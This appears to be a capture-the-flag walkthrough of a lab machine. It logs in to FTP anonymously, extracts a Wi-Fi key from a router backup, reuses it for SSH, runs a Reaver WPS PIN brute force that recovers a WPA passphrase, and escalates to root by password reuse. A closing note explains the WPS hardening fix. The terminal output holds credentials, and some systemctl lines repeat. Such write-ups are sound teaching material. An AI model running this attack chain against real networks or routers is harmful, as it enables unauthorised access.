@@ -1,0 +1,411 @@
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ftp 10.10.11.247
+Connected to 10.10.11.247.
+220 (vsFTPd 3.0.3)
+Name (10.10.11.247:kali): Anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering Extended Passive Mode (|||43312|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
+-rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
+-rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
+-rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
+-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
+226 Directory send OK.
+ftp> mget backup-OpenWrt-2023-07-26.tar
+mget backup-OpenWrt-2023-07-26.tar [anpqy?]? y
+229 Entering Extended Passive Mode (|||44139|)
+150 Opening BINARY mode data connection for backup-OpenWrt-2023-07-26.tar (40960 bytes).
+100% |************************************************************************| 40960        1.57 MiB/s    00:00 ETA
+226 Transfer complete.
+40960 bytes received in 00:00 (833.52 KiB/s)
+ftp> bye
+221 Goodbye.
+
+
+The txt file mentions to check
+the security of their Reaver tool 
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# tar -xvf backup-OpenWrt-2023-07-26.tar
+./etc/
+./etc/config/
+./etc/config/system
+./etc/config/wireless
+./etc/config/firewall
+./etc/config/network
+./etc/config/uhttpd
+./etc/config/dropbear
+./etc/config/ucitrack
+./etc/config/rpcd
+./etc/config/dhcp
+./etc/config/luci
+./etc/uhttpd.key
+./etc/uhttpd.crt
+./etc/sysctl.conf
+./etc/inittab
+./etc/group
+./etc/opkg/
+./etc/opkg/keys/
+./etc/opkg/keys/4d017e6f1ed5d616
+./etc/hosts
+./etc/passwd
+./etc/shinit
+./etc/rc.local
+./etc/dropbear/
+./etc/dropbear/dropbear_ed25519_host_key
+./etc/dropbear/dropbear_rsa_host_key
+./etc/shells
+./etc/profile
+./etc/nftables.d/
+./etc/nftables.d/10-custom-filter-chains.nft
+./etc/nftables.d/README
+./etc/luci-uploads/
+./etc/luci-uploads/.placeholder
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+┌──(root㉿kali)-[/home/kali/etc/config]
+└─# ls
+dhcp  dropbear  firewall  luci  network  rpcd  system  ucitrack  uhttpd  wireless
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali/etc/config]
+└─# cat wireless
+
+config wifi-device 'radio0'
+	option type 'mac80211'
+	option path 'virtual/mac80211_hwsim/hwsim0'
+	option cell_density '0'
+	option channel 'auto'
+	option band '2g'
+	option txpower '20'
+
+config wifi-device 'radio1'
+	option type 'mac80211'
+	option path 'virtual/mac80211_hwsim/hwsim1'
+	option channel '36'
+	option band '5g'
+	option htmode 'HE80'
+	option cell_density '0'
+
+config wifi-iface 'wifinet0'
+	option device 'radio0'
+	option mode 'ap'
+	option ssid 'OpenWrt'
+	option encryption 'psk'
+	option key 'VeRyUniUqWiFIPasswrd1!'
+	option wps_pushbutton '1'
+
+
+┌──(root㉿kali)-[/home/kali/etc/config]
+└─# ssh netadmin@10.10.11.247
+The authenticity of host '10.10.11.247 (10.10.11.247)' can't be established.
+ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.247' (ED25519) to the list of known hosts.
+netadmin@10.10.11.247's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)
+...
+Last login: Tue Sep 12 12:46:00 2023 from 10.10.14.23
+netadmin@wifinetic:~$ 
+
+"Upon enumerating the network configurations, we have identified the presence of two wireless
+interfaces, each with an assigned IP address. Additionally, the BSSID (Basic Service Set Identifier) is
+available for both wireless interfaces. However, it is unclear from the information which interface
+serves as the Access Point (AP) in this specific environment.
+To clarify the roles of these wireless interfaces and determine the AP, we will further investigate
+the network configurations and cross-reference them with the available wireless settings. This
+examination will allow us to distinguish between the client and AP interfaces."
+
+netadmin@wifinetic:~$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
+        inet6 fe80::250:56ff:feb0:6cdf  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef::250:56ff:feb0:6cdf  prefixlen 64  scopeid 0x0<global>
+        ether 00:50:56:b0:6c:df  txqueuelen 1000  (Ethernet)
+        RX packets 91494  bytes 6370113 (6.3 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 66706  bytes 3698151 (3.6 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 223270  bytes 14835667 (14.8 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 223270  bytes 14835667 (14.8 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
+        RX packets 869694  bytes 154312369 (154.3 MB)
+        RX errors 0  dropped 869694  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
+        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
+        RX packets 16628  bytes 1874812 (1.8 MB)
+        RX errors 0  dropped 4111  overruns 0  frame 0
+        TX packets 21252  bytes 2824024 (2.8 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
+        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
+        RX packets 8719  bytes 1214978 (1.2 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 16628  bytes 2174116 (2.1 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+netadmin@wifinetic:~$ sudo -l
+[sudo] password for netadmin: 
+Sorry, user netadmin may not run sudo on wifinetic.
+netadmin@wifinetic:~$ systemctl status
+● wifinetic
+    State: degraded
+     Jobs: 0 queued
+   Failed: 9 units
+    Since: Sun 2025-09-21 05:02:37 UTC; 23h ago
+   CGroup: /
+           ├─user.slice 
+           │ └─user-1000.slice 
+           │   ├─user@1000.service 
+           │   │ └─init.scope 
+           │   │   ├─111436 /lib/systemd/systemd --user
+           │   │   └─111437 (sd-pam)
+           │   └─session-28.scope 
+           │     ├─111379 sshd: netadmin [priv]
+           │     ├─111536 sshd: netadmin@pts/0
+           │     ├─111537 -bash
+           │     ├─111992 systemctl status
+           │     └─111993 pager
+           ├─init.scope 
+           │ └─1 /sbin/init maybe-ubiquity
+           └─system.slice 
+             ├─irqbalance.service 
+             │ └─933 /usr/sbin/irqbalance --foreground
+             ├─open-vm-tools.service 
+             │ └─790 /usr/bin/vmtoolsd
+             ├─systemd-udevd.service 
+             │ └─507 /lib/systemd/systemd-udevd
+             ├─cron.service 
+             │ └─1158 /usr/sbin/cron -f
+             ├─polkit.service 
+             │ └─934 /usr/lib/policykit-1/polkitd --no-debug
+             ├─auditd.service 
+             │ ├─754 /sbin/auditd
+             │ ├─756 /sbin/audispd
+             │ └─760 /usr/local/sbin/laurel --config /etc/laurel/config.toml
+             ├─multipathd.service 
+             │ └─723 /sbin/multipathd -d -s
+             ├─accounts-daemon.service 
+             │ └─904 /usr/lib/accountsservice/accounts-daemon
+             ├─wpa_supplicant.service 
+             │ └─111962 /sbin/wpa_supplicant -u -s -c /etc/wpa_supplicant.conf -i wlan1
+             ├─ModemManager.service 
+             │ └─990 /usr/sbin/ModemManager
+             ├─systemd-journald.service 
+             │ └─471 /lib/systemd/systemd-journald
+             ├─atd.service 
+             │ └─1169 /usr/sbin/atd -f
+             ├─ssh.service 
+             │ └─1197 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+             ├─vgauth.service 
+             │ └─784 /usr/bin/VGAuthService
+             ├─hostapd.service 
+             │ └─111952 /usr/sbin/hostapd -B -P /run/hostapd.pid -B /etc/hostapd/hostapd.conf
+             ├─snapd.service 
+             │ └─949 /usr/lib/snapd/snapd
+             ├─dhclient.service 
+             │ └─911 /sbin/dhclient wlan1 -v
+             ├─vsftpd.service 
+             │ └─1174 /usr/sbin/vsftpd /etc/vsftpd.conf
+             ├─rsyslog.service 
+             ├─polkit.service 
+             │ └─934 /usr/lib/policykit-1/polkitd --no-debug
+             ├─auditd.service 
+             │ ├─754 /sbin/auditd
+             │ ├─756 /sbin/audispd
+             │ └─760 /usr/local/sbin/laurel --config /etc/laurel/config.toml
+             ├─multipathd.service 
+             │ └─723 /sbin/multipathd -d -s
+             ├─accounts-daemon.service 
+             │ └─904 /usr/lib/accountsservice/accounts-daemon
+             ├─wpa_supplicant.service 
+             │ └─111962 /sbin/wpa_supplicant -u -s -c /etc/wpa_supplicant.conf -i wlan1
+             ├─ModemManager.service 
+             │ └─990 /usr/sbin/ModemManager
+             ├─systemd-journald.service 
+             │ └─471 /lib/systemd/systemd-journald
+             ├─atd.service 
+             │ └─1169 /usr/sbin/atd -f
+             ├─ssh.service 
+             │ └─1197 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+             ├─vgauth.service 
+             │ └─784 /usr/bin/VGAuthService
+             ├─hostapd.service 
+             │ └─111952 /usr/sbin/hostapd -B -P /run/hostapd.pid -B /etc/hostapd/hostapd.conf
+             ├─snapd.service 
+             │ └─949 /usr/lib/snapd/snapd
+             ├─dhclient.service 
+             │ └─911 /sbin/dhclient wlan1 -v
+             ├─vsftpd.service 
+             │ └─1174 /usr/sbin/vsftpd /etc/vsftpd.conf
+             ├─rsyslog.service 
+             │ └─111962 /sbin/wpa_supplicant -u -s -c /etc/wpa_supplicant.conf -i wlan1
+             ├─ModemManager.service 
+             │ └─990 /usr/sbin/ModemManager
+             ├─systemd-journald.service 
+             │ └─471 /lib/systemd/systemd-journald
+             ├─atd.service 
+             │ └─1169 /usr/sbin/atd -f
+             ├─ssh.service 
+             │ └─1197 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+             ├─vgauth.service 
+             │ └─784 /usr/bin/VGAuthService
+             ├─hostapd.service 
+             │ └─111952 /usr/sbin/hostapd -B -P /run/hostapd.pid -B /etc/hostapd/hostapd.conf
+             ├─snapd.service 
+             │ └─949 /usr/lib/snapd/snapd
+             ├─dhclient.service 
+             │ └─911 /sbin/dhclient wlan1 -v
+             ├─vsftpd.service 
+             │ └─1174 /usr/sbin/vsftpd /etc/vsftpd.conf
+             ├─rsyslog.service 
+             │ └─945 /usr/sbin/rsyslogd -n -iNONE
+netadmin@wifinetic:~$ iw dev
+phy#2
+	Interface mon0
+		ifindex 7
+		wdev 0x200000002
+		addr 02:00:00:00:02:00
+		type monitor
+		txpower 20.00 dBm
+	Interface wlan2
+		ifindex 5
+		wdev 0x200000001
+		addr 02:00:00:00:02:00
+		type managed
+		txpower 20.00 dBm
+phy#1
+	Unnamed/non-netdev interface
+		wdev 0x100000815
+		addr 42:00:00:00:01:00
+		type P2P-device
+		txpower 20.00 dBm
+	Interface wlan1
+		ifindex 4
+		wdev 0x100000001
+		addr 02:00:00:00:01:00
+		ssid OpenWrt
+		type managed
+		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
+		txpower 20.00 dBm
+phy#0
+	Interface wlan0
+		ifindex 3
+		wdev 0x1
+		addr 02:00:00:00:00:00
+		ssid OpenWrt
+		type AP
+		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
+		txpower 20.00 dBm
+netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1
+
+Reaver v1.6.5 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Switching mon0 to channel 1
+[+] Waiting for beacon from 02:00:00:00:00:00
+[+] Received beacon from 02:00:00:00:00:00
+[+] Trying pin "12345670"
+[+] Sending authentication request
+[!] Found packet with bad FCS, skipping...
+[+] Sending association request
+[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+[+] Received WSC NACK
+[+] Sending WSC NACK
+[!] WPS transaction failed (code: 0x04), re-trying last pin
+[+] Trying pin "12345670"
+[+] Sending authentication request
+[+] Sending association request
+[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+[+] Received WSC NACK
+[+] Sending WSC NACK
+[!] WPS transaction failed (code: 0x04), re-trying last pin
+[+] Trying pin "12345670"
+[+] Sending authentication request
+[+] Sending association request
+[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+[+] Received M3 message
+[+] Sending M4 message
+[+] Received M5 message
+[+] Sending M6 message
+[+] Received M7 message
+[+] Sending WSC NACK
+[+] Sending WSC NACK
+[+] Pin cracked in 4 seconds
+[+] WPS PIN: '12345670'
+[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
+[+] AP SSID: 'OpenWrt'
+[+] Nothing done, nothing to save.
+netadmin@wifinetic:~$ 
+
+we reuse the password for root.
+
+
+netadmin@wifinetic:~$ su root
+Password: 
+root@wifinetic:/home/netadmin# whoami
+root
+
+
+
+
+
+"Most public Wi-Fi routers use HostAP with the ap_setup_locked configuration set to 0
+which allows an attacker to brute force the WPS PIN infinite times. We can simply fix this
+misconfiguration by changing it to 3 . In this scenario the PIN is being set from a script (due
+to the dynamic nature of this machine). Making sure that the WPS PIN is never the same is
+also important."
+
+
+
+
+
